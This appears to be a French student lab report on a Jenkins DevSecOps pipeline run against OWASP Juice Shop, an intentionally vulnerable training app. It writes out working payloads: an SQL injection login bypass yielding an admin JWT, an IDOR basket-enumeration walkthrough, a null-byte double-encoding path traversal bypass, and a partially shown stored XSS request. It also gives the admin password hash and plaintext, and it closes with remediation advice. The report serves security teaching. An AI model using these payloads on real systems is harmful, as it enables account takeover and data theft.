Contexte et objectifs

Ce travail pratique s'inscrit dans le module Sécurité des données de la Licence Cybersécurité (UNCHK). L'objectif est de concevoir et d'exécuter un pipeline CI/CD de sécurité automatisé orchestré par Jenkins, couvrant la détection et l'exploitation de vulnérabilités sur l'application OWASP Juice Shop.

Objectifs pédagogiques

Concevoir un pipeline de sécurité CI/CDJenkins + Jenkinsfile (Groovy DSL)
Automatiser les tests OWASP Top 106 scripts Bash (TEST 01–06)

Intégrer la sécurité dans le cycle CI/CD (DevSecOps)catchError, archiveArtifacts, UNSTABLE

Les conteneurs sont démarrés via docker compose up -d. Le socket Docker (/var/run/docker.sock) est monté dans Jenkins. Les scripts Bash sont injectés via un volume en lecture seule.

Différence avec le LAB 2 : ce laboratoire remplace OWASP ZAP par une approche DevSecOps — les tests sont intégrés dans un pipeline CI/CD Jenkins, permettant la régression de sécurité automatique à chaque build.

TEST 04 Sécurité de l'authentification — SQLi + Rate Limiting
A03:2021 A07:2021 CVSS 9.8 ❌ FAILURE

SQL Injection sur POST /rest/user/login

Payload utilisé :

{ "email": "' OR '1'='1'--", "password": "x" }

Résultat : HTTP 200 — JWT valide retourné sans credentials légitimes.

[CRITICAL] SQLi réussie — JWT retourné sans credentials valides. La requête SQL backend non paramétrée évalue ' OR '1'='1'-- comme toujours vraie et retourne le premier utilisateur (admin, ID=1).

Verbosité des messages d'erreur

Réponse : Invalid email or password.
Message générique — pas d'énumération de comptes. Point positif.

Rate Limiting

EXP-01 SQL Injection → JWT Administrateur
A03:2021 CVSS 9.8 ✅ Réussi

Objectif : Obtenir un JWT administrateur sans connaître le mot de passe.

POST /rest/user/login HTTP/1.1
Content-Type: application/json

{ "email": "' OR '1'='1'--", "password": "x" }

Résultat : HTTP 200 — JWT valide retourné.

JWT admin décodé :

{
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "isActive": true,
    "createdAt": "2026-08-10 18:48:07.694 +00:00"
  },
  "bid": 1,
  "iat": 1786388813
}
Impact démontré :
  • Accès administrateur complet sans credential valide
  • Hash MD5 du mot de passe admin exposé dans le payload JWT : 0192023a7bbd73250516f069df18b500
  • Ce hash correspond au mot de passe admin123 — cassable en quelques secondes par rainbow table
  • Identité confirmée via /rest/user/whoami : admin@juice-sh.op

EXP-02 IDOR — Accès aux paniers d'autres utilisateurs
A01:2021 CVSS 8.1 ✅ Réussi

Objectif : Accéder au panier d'un autre utilisateur en manipulant l'identifiant de ressource.

Principe : L'API /rest/basket/{id} ne vérifie pas que l'utilisateur authentifié est propriétaire du panier demandé (absence de contrôle d'autorisation).

Déroulement :

  1. Création d'un compte attaquant (attacker_23568@lab.local)
  2. Connexion et obtention du JWT attaquant
  3. Requête GET /rest/basket/1 avec le JWT attaquant → HTTP 200
  4. Lecture complète du panier de la victime (ID=1)

Contenu du panier victime consulté :

Apple Juice (1000ml)   × 2   — 1.99 €  (ProductId: 1)
Orange Juice (1000ml)  × 3   — 2.99 €  (ProductId: 2)
Eggfruit Juice (500ml) × 1   — 8.99 €  (ProductId: 3)
BasketId: 1  |  UserId: 1
Impact démontré : Un attaquant authentifié peut lire le panier de n'importe quel utilisateur en incrémentant l'ID de 1 à N. Le même principe s'applique potentiellement à d'autres ressources utilisant des IDs séquentiels.
  • captures/reports/evidence/EXP02_basket_1.json
EXP-03 Path Traversal /ftp/ + Bypass par Null Byte
A01:2021 CVSS 7.5 ✅ Réussi

Objectif : Accéder à des fichiers sensibles exposés via le répertoire /ftp/.

FichierMéthodeHTTPRésultat
/ftp/acquisitions.mdGET direct200✅ Téléchargé
/ftp/legal.mdGET direct200✅ Téléchargé
/ftp/eastere.ggGET direct403❌ Bloqué
/ftp/package.json.bakGET direct403❌ Bloqué
/ftp/package.json.bak%2500.mdNull byte bypass200✅ Filtre contourné

Extrait de acquisitions.md (confidentiel) :

# Planned Acquisitions
> This document is confidential! Do not distribute!
Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact...

Technique null byte : Le filtre d'extension bloque les fichiers .bak. En encodant un null byte (%00 → %2500 en double URL-encoding), le serveur traite le chemin comme se terminant par .md et sert le fichier .bak réel.

Extrait de package.json.bak (métadonnées sensibles) :

{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application",
  "author": "Björn Kimminich <bjoern.kimminich@owasp.org>"
}
Impact : Documents d'acquisition confidentiels accessibles sans authentification. Version exacte du logiciel exposée (facilite la recherche de CVE ciblés). Filtre d'extension contournable par double encodage.

A03:2021 CVSS 7.2 ⚠️ Partiel

Objectif : Injecter un payload JavaScript persistant dans les feedbacks de l'application.

Requête :

POST /api/Feedbacks HTTP/1.1
Content-Type: application/json

{

Recommandations

Corrections prioritaires (Critique)

R01 Prévenir les injections SQL Critique
  • Utiliser des requêtes préparées ou un ORM avec protection intégrée (Sequelize : where: { email: req.body.email } sans interpolation)
  • Valider et assainir toutes les entrées utilisateur côté serveur
  • Implémenter un WAF (Web Application Firewall) en amont
R02 Corriger les IDOR Critique
  • Vérifier systématiquement la propriété : if (basket.UserId !== req.user.id) return res.status(403).end()
  • Remplacer les identifiants séquentiels par des UUIDs v4 non prédictibles

Corrections élevées

R03 Restreindre l'accès aux fichiers sensibles Élevé
  • Déplacer les fichiers confidentiels hors de la racine web publique
  • Valider strictement les chemins côté serveur (whitelist d'extensions, neutralisation des null bytes)
  • Supprimer ou protéger par authentification le répertoire /ftp/
R04 Corriger le XSS Stocké Élevé
  • Encoder toutes les sorties HTML (output encoding)
  • Implémenter une CSP stricte bloquant javascript: dans les attributs src
  • Assainir les entrées utilisateur (strip tags, HTML encoding)

Améliorations de configuration

R05 Ajouter les en-têtes de sécurité manquants Moyen 
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
Access-Control-Allow-Origin: https://[domaine-specifique]
R06 Désactiver les méthodes HTTP dangereuses Moyen 
// Express.js middleware
app.use((req, res, next) => {
  if (['TRACE', 'TRACK'].includes(req.method))
    return res.status(405).end();
  next();
});
R07 Implémenter le rate limiting sur l'authentification Moyen 
const rateLimit = require('express-rate-limit');
app.use('/rest/user/login', rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,
  message: 'Too many login attempts, please try again later'
}));
R08 Protéger les endpoints d'administration Élevé
  • Restreindre /rest/admin/application-configuration aux seuls administrateurs authentifiés
  • Masquer le champ UserId dans les réponses publiques de /api/Feedbacks
  • Implémenter un contrôle d'accès basé sur les rôles (RBAC) cohérent
8

Conclusion

Ce laboratoire a permis de concevoir et d'exécuter un pipeline CI/CD de sécurité complet orchestré par Jenkins, identifiant et exploitant 8 vulnérabilités réparties sur 4 catégories du Top 10 OWASP 2021.

Les vulnérabilités les plus critiques — l'injection SQL (CVSS 9.8) et l'IDOR (CVSS 8.1) — permettent respectivement d'obtenir un accès administrateur complet et de lire les données privées de n'importe quel utilisateur. L'exploitation enchaînée démontre le principe de pivot : l'injection SQL (EXP-01) fournit le JWT admin nécessaire pour accéder aux endpoints protégés, révélant à leur tour la configuration interne qui facilite d'autres attaques.

L'approche CI/CD présente un avantage majeur sur les audits ponctuels : l'automatisation de la régression de sécurité. Chaque build garantit qu'une correction introduite ne disparaît pas silencieusement lors d'une refonte. Le statut UNSTABLE signale immédiatement la présence de vulnérabilités sans bloquer les déploiements légitimes.

Ce laboratoire illustre concrètement l'intégration du concept DevSecOps : la sécurité n'est plus un audit ponctuel mais un contrôle continu intégré dans le cycle de développement logiciel.
